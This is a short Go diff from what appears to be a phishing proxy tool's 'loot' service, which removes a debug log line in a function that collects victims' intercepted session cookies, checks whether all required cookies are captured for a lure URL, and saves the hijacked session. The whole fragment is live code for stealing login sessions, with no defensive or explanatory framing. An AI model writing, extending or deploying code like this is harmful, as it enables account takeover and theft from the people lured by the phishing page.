@@ -266,7 +266,6 @@ func (s *lootService) SaveCookies(c *fiber.Ctx, destURL *url.URL, cookies []*htt
 	for _, cookie := range cookies {
 		s.saveCookie(sessCtx, destURL, cookie)
 	}
-	log.Printf("sid: %s sessCtx addr: %p allCookies = %v\n", sess.ID(), sessCtx, sessCtx.allCookies)
 	if len(sessCtx.requiredCookies) == s.requiredCookiesNum {
 		log.Printf("lureURL: %s sid: %s session cookies are captured!\n", getLureURL(sess), sess.ID())
 		err = s.saveCapturedSession(sess, sessCtx)
